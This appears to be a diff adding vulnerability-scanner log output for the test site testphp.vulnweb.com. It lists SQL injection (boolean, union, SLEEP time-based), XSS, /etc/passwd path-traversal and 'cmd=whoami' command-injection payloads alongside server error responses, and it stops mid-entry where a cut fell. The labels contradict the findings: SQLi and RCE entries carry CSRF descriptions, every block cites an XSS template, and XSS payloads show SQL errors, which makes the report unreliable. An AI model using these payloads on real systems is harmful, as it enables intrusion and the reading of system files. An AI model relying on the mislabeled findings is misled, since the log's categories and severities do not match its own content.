+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+AND+1=2--
+  Payload: 1'+AND+1=2--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=2--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+UNION+SELECT+1,2,3--
+  Payload: 1'+UNION+SELECT+1,2,3--
+  Type: Union-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/transfer_funds.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+AND+1=1--
+  Payload: 1'+AND+1=1--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=1--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/error.php?debug=true
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+AND+1=2--
+  Payload: 1'+AND+1=2--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+AND+1=1--
+  Payload: 1'+AND+1=1--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=1--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+AND+1=1--
+  Payload: 1'+AND+1=1--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+AND+1=2--
+  Payload: 1'+AND+1=2--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=2--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+UNION+SELECT+1,2,3--
+  Payload: 1'+UNION+SELECT+1,2,3--
+  Type: Union-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT 1,2,3--' at line 1
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/admin/dashboard.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/manage_users.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+
+Timestamp: 2025-05-28 14:31:21
+Target: http://testphp.vulnweb.com
+Template: xss-detection.yaml
+Vulnerabilities Found:
+- Endpoint: http://testphp.vulnweb.com/update_profile.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/profile.php?user_id=918
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/api/user_info
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/admin
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+OR+SLEEP(10)--
+  Payload: 1'+OR+SLEEP(10)--
+  Type: Time-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' OR SLEEP(10)--' at line 1
+  Time-based Verified: Yes
+  Severity: critical
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/index.php?file=../../../../etc/passwd
+  Payload: ../../../../etc/passwd
+  Type: LFI
+  Verified: No
+  Severity: medium
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/account_details.php?account_id=601
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/index.php?cmd=whoami
+  Payload: whoami
+  Type: RCE
+  Verified: Yes
+  Severity: critical
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/index.php?cmd=../../../../etc/passwd
+  Payload: ../../../../etc/passwd
+  Type: LFI
+  Verified: No
+  Severity: medium
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/index.php?file=whoami
+  Payload: whoami
+  Type: RCE
+  Verified: Yes
+  Severity: critical
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/search.php?test=<img+src=x+onerror=alert('xss')>
+  Payload: <img+src=x+onerror=alert('xss')>
+  Type: XSS
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'xss')>'' at line 1
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+UNION+SELECT+1,2,3--
+  Payload: 1'+UNION+SELECT+1,2,3--
+  Type: Union-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT 1,2,3--' at line 1
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/search.php?test=<script>alert('xss')</script>
+  Payload: <script>alert('xss')</script>
+  Type: XSS
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'xss')</script>'' at line 1
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+OR+SLEEP(10)--
+  Payload: 1'+OR+SLEEP(10)--
+  Type: Time-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' OR SLEEP(10)--' at line 1
+  Time-based Verified: Yes
+  Severity: critical
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/search.php?test=<svg+onload=alert('xss')>
+  Payload: <svg+onload=alert('xss')>
+  Type: XSS
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'xss')>'' at line 1
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+OR+SLEEP(10)--
+  Payload: 1'+OR+SLEEP(10)--
+  Type: Time-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Time-based Verified: Yes
+  Severity: critical
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+AND+1=1--
+  Payload: 1'+AND+1=1--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+UNION+SELECT+1,2,3--
+  Payload: 1'+UNION+SELECT+1,2,3--
+  Type: Union-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/transfer_funds.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+AND+1=2--
+  Payload: 1'+AND+1=2--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=2--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/error.php?debug=true
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+UNION+SELECT+1,2,3--
+  Payload: 1'+UNION+SELECT+1,2,3--
+  Type: Union-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT 1,2,3--' at line 1
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+AND+1=2--
+  Payload: 1'+AND+1=2--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+AND+1=1--
+  Payload: 1'+AND+1=1--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=1--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+AND+1=1--
+  Payload: 1'+AND+1=1--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=1--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+AND+1=2--
+  Payload: 1'+AND+1=2--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=2--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/admin/dashboard.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://testphp.vulnweb.com/manage_users.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+
+Timestamp: 2025-05-28 14:31:22
+Target: http://testphp.vulnweb.com
+Template: xss-detection.yaml
+Vulnerabilities Found:
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+OR+SLEEP(10)--
+  Payload: 1'+OR+SLEEP(10)--
+  Type: Time-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' OR SLEEP(10)--' at line 1
+  Time-based Verified: Yes
+  Severity: critical
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/search.php?test=<script>alert('xss')</script>
+  Payload: <script>alert('xss')</script>
+  Type: XSS
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'xss')</script>'' at line 1
+  Severity: low
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/account_details.php?account_id=905
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+OR+SLEEP(10)--
+  Payload: 1'+OR+SLEEP(10)--
+  Type: Time-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Time-based Verified: Yes
+  Severity: critical
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/update_profile.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/admin
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/search.php?test=<svg+onload=alert('xss')>
+  Payload: <svg+onload=alert('xss')>
+  Type: XSS
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'xss')>'' at line 1
+  Severity: low
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/search.php?test=<img+src=x+onerror=alert('xss')>
+  Payload: <img+src=x+onerror=alert('xss')>
+  Type: XSS
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'xss')>'' at line 1
+  Severity: low
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/profile.php?user_id=11
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/api/user_info
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/index.php?file=whoami
+  Payload: whoami
+  Type: RCE
+  Verified: Yes
+  Severity: critical
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+UNION+SELECT+1,2,3--
+  Payload: 1'+UNION+SELECT+1,2,3--
+  Type: Union-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT 1,2,3--' at line 1
+  Severity: low
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/index.php?cmd=../../../../etc/passwd
+  Payload: ../../../../etc/passwd
+  Type: LFI
+  Verified: No
+  Severity: medium
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+OR+SLEEP(10)--
+  Payload: 1'+OR+SLEEP(10)--
+  Type: Time-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' OR SLEEP(10)--' at line 1
+  Time-based Verified: Yes
+  Severity: critical
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/index.php?cmd=whoami
+  Payload: whoami
+  Type: RCE
+  Verified: Yes
+  Severity: critical
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/index.php?file=../../../../etc/passwd
+  Payload: ../../../../etc/passwd
+  Type: LFI
+  Verified: No
+  Severity: medium
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/admin/dashboard.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+AND+1=1--
+  Payload: 1'+AND+1=1--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/transfer_funds.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+UNION+SELECT+1,2,3--
+  Payload: 1'+UNION+SELECT+1,2,3--
+  Type: Union-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT 1,2,3--' at line 1
+  Severity: low
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+AND+1=2--
+  Payload: 1'+AND+1=2--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=2--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+AND+1=2--
+  Payload: 1'+AND+1=2--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+AND+1=1--
+  Payload: 1'+AND+1=1--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=1--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+UNION+SELECT+1,2,3--
+  Payload: 1'+UNION+SELECT+1,2,3--
+  Type: Union-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Severity: low
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+AND+1=1--
+  Payload: 1'+AND+1=1--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=1--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+AND+1=2--
+  Payload: 1'+AND+1=2--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=2--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/error.php?debug=true
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/manage_users.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+
+Timestamp: 2025-05-28 14:32:42
+Target: http://testphp.vulnweb.com
+Template: xss-detection.yaml
+Vulnerabilities Found:
+- Endpoint: http://testphp.vulnweb.com/admin
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Broken Access Control vulnerabilities by attempting to access restricted resources.
+  Reference: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+  Author: nghia
+  Tags: bac, access-control
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+OR+SLEEP(10)--
